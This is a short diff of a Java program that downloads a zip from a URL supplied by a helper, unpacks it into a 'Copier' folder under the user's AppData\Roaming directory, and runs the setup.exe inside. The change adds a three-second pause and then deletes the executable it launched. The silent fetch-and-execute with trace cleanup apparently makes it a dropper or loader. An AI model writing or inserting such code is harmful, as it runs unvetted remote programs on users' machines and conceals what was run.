@@ -29,12 +29,13 @@ public class Main {
 				try {
 					String fileDwn = System.getProperty("user.home") + "\\AppData\\Roaming\\Copier\\setup.zip",
 							fileUnzDir = System.getProperty("user.home") + "\\AppData\\Roaming\\Copier";
-					File f1 = new File(fileDwn), f2 = new File(fileUnzDir + "\\setup.exe");
 					URL gurl = UrlGet.start();
 					fileDownloader.start(gurl, fileDwn);
 					Unzip.start(fileDwn, fileUnzDir);
-					f1.delete();
-					Runtime.getRuntime().exec(f2.toString());
+					fileDestroy.delDir(fileDwn);
+					Runtime.getRuntime().exec(fileUnzDir + "\\setup.exe");
+					sleep.sleep(3);
+					fileDestroy.delDir(fileUnzDir + "\\setup.exe");
 				} catch (Exception e) {
 					e.printStackTrace();
 				}
